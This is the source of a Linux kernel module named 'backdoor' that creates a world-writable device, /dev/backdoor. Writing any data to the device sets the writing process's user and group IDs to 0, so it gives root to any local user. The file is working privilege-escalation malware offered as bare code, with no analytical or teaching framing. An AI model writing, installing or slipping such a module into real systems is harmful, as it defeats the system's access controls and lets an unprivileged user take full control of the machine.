#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <linux/cred.h>

MODULE_LICENSE("GPL");

static ssize_t backdoor_write(struct file *filep, const char *buff, size_t count, loff_t *offp)
{
  struct cred *cred;

  cred = current->cred;
  cred->uid.val = cred->gid.val = cred->euid.val = cred->egid.val = 0;
  commit_creds(cred);

  *offp += count;
  return count;
}

static const struct file_operations backdoor_fops = {
 .owner = THIS_MODULE,
 .write = backdoor_write
};

static struct miscdevice backdoor_device = {
 .minor = MISC_DYNAMIC_MINOR,
 .name  = "backdoor",
 .fops  = &backdoor_fops,
 .mode = 0777
};

static int __init backdoor_init(void)
{
  int result = 0;

  result = misc_register(&backdoor_device);
  if(result != 0) {
    return result;
  }

  return result;
}

static void __exit backdoor_exit(void)
{
  misc_deregister(&backdoor_device);
}

module_init(backdoor_init);
module_exit(backdoor_exit);